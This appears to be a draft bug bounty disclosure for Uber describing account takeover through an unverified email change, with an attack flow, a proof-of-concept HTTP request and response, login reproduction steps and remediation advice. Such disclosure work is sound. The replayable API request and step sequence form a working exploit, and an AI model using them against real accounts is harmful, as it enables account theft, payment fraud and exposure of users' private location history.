# Critical: Account Takeover via Email Change Without Verification

**Date**: 2025-12-06
**Severity**: Critical (P1)
**Program**: Uber Bug Bounty (HackerOne)
**Estimated Bounty**: $8,000 - $15,000+

---

## Summary

A critical account takeover vulnerability exists in Uber's email change functionality. An attacker can change a victim's email address to an attacker-controlled address via API, and then use that pending (unverified) email to receive authentication OTP codes, gaining full access to the victim's account.

## Vulnerability Details

**Type**: Broken Authentication / Account Takeover
**CVSS Score**: 9.8 (Critical)
**CWE**: CWE-287 (Improper Authentication), CWE-306 (Missing Authentication for Critical Function)

### Root Cause

1. Email changes via `POST /api/updateUserInfo` set the email status to `PENDING` but DO NOT require verification before that email can be used for authentication
2. Uber's login flow sends OTP codes to the PENDING (unverified) email address
3. No confirmation is required from the original email before the change takes effect for authentication purposes

## Attack Flow

```
1. Victim is logged into Uber with email: victim@example.com
2. Attacker obtains victim's session (via XSS, session hijacking, or authenticated attacker scenario)
3. Attacker calls: POST /api/updateUserInfo with email: attacker@evil.com
4. Email changes to PENDING status (no verification sent/required)
5. Attacker goes to auth.uber.com, enters attacker@evil.com
6. Uber shows "Welcome back, [Victim Name]" and sends OTP to attacker@evil.com
7. Attacker receives OTP, enters it
8. Attacker has FULL ACCESS to victim's account
```

## Proof of Concept

### Step 1: Initial State
- Account A logged in with email: `sgbusrqg@sharklasers.com`
- Account name: "Aynorica Tester"
- UUID: `0f9ac5ed-40a0-45e9-a97d-a8028c953566`

### Step 2: Email Change via API

```http
POST https://account.uber.com/api/updateUserInfo?localeCode=en HTTP/2
Content-Type: application/json
Cookie: [session cookies]

{
  "userInfoUpdate": {
    "userInfoUpdateType": "EMAIL",
    "email": {
      "emailAddress": "ubertestp0c@guerrillamail.com"
    }
  }
}
```

### Step 3: API Response (Email Changed Successfully)

```json
{
  "status": "success",
  "data": {
    "ok": true,
    "userInfo": {
      "email": {
        "emailAddress": "ubertestp0c@guerrillamail.com"
      },
      "emailAttributes": {
        "verificationStatus": "PENDING",
        "isEditable": true,
        "shouldLinkToAccountPage": false
      }
    }
  }
}
```

**Critical Finding**: Email status is "PENDING" (not verified), yet it can be used for authentication.

### Step 4: Login with Attacker-Controlled Email

1. Navigate to `https://auth.uber.com`
2. Enter email: `ubertestp0c@guerrillamail.com`
3. Complete CAPTCHA
4. Uber displays: **"Welcome back, Aynorica."**
5. Uber states: **"Enter the 4-digit code sent to you at: ubertestp0c@guerrillamail.com"**

### Step 5: OTP Received at Attacker Email

Email received at `ubertestp0c@guerrillamail.com`:
- From: admin@uber.com
- Subject: "Your Uber account verification code"
- OTP Code: **0618**

### Step 6: Full Account Access

After entering OTP, attacker gains full access to victim's account:
- Can book rides
- Can view payment methods
- Can view ride history
- Can access all account features
- Can change other account settings

## Impact

### Immediate Impact
- **Complete Account Takeover**: Attacker gains full control of victim's Uber account
- **Financial Loss**: Attacker can book rides using victim's payment methods
- **Privacy Breach**: Access to ride history, saved locations (home/work), contact info
- **Identity Theft**: Can use account for fraudulent purposes

### Attack Scenarios

1. **Targeted Attack**: Attacker with temporary access to victim's session (XSS, shoulder surfing, shared device) can permanently take over account

2. **Insider Threat**: Employee or support staff with session access can escalate to full account control

3. **Session Theft Escalation**: Any session compromise becomes permanent account takeover

### Affected Users
- All Uber users globally
- Riders and Drivers
- Business accounts

## Remediation Recommendations

### Immediate (P0)
1. **Require current email verification** before allowing email changes to be used for authentication
2. **Send security alert** to original email when email change is initiated
3. **Implement cooling-off period** - new email cannot be used for auth for 24-48 hours

### Short-term
4. **Add step-up authentication** for email changes (require password or 2FA)
5. **Rate limit email changes** per account
6. **Log and alert** on rapid email changes

### Long-term
7. **Implement verified email requirement** - only verified emails can receive OTPs
8. **Add account recovery verification** with multiple factors
9. **Consider FIDO2/Passkey** as primary authentication

## Timeline

| Time | Action |
|------|--------|
| 2025-12-06 13:28 | Email changed via API to attacker-controlled address |
| 2025-12-06 13:36 | Login attempt with new email succeeded |
| 2025-12-06 13:36 | OTP received at attacker email |
| 2025-12-06 13:37 | Full account access confirmed |

## Evidence

### API Request/Response
- Email change request: Successful with PENDING status
- No verification required
- Immediate use for authentication

### Screenshots/Logs
1. API response showing `verificationStatus: PENDING`
2. Auth page showing "Welcome back, Aynorica" with attacker email
3. OTP email received at attacker-controlled inbox
4. Full account access showing victim's name

### Browser Evidence
- Final URL: `https://m.uber.com/go/home`
- Menu showing "Aynorica Tester" account name
- Full account functionality accessible

---

## Disclosure

**Responsible Disclosure**: This vulnerability will be reported to Uber's Bug Bounty Program on HackerOne.

**Researcher**: [Your HackerOne username]
**Date Discovered**: 2025-12-06
